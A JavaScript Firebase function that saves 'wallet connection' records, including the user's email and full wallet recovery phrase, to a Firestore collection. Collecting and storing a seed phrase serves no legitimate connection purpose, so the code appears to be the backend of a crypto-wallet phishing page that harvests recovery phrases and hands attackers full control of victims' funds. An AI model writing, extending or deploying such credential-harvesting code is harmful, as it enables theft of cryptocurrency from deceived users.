export const saveWalletConnection = async (walletData) => {
  try {
    const currentUser = auth.currentUser;

    const walletUID = Math.random().toString(36).substring(2, 18);

    const docData = {
      walletUID,
      userId: currentUser?.uid || null,
      walletName: walletData.name,
      walletType: walletData.type,
      submittedEmail: walletData.email || null,
      
      // ✅ Use consistent field name
      recoveryPhrase: walletData.recoveryPhrase || null,
      wordCount: walletData.wordCount || null,

      createdAt: serverTimestamp(),
      isActive: true,
    };

    const docRef = await addDoc(collection(db, "walletConnections"), docData);

    return {
      success: true,
      uid: walletUID,
      docId: docRef.id,
    };
  } catch (error) {
    console.error("Save Wallet Error:", error);
    return {
      success: false,
      error: error.message,
    };
  }
};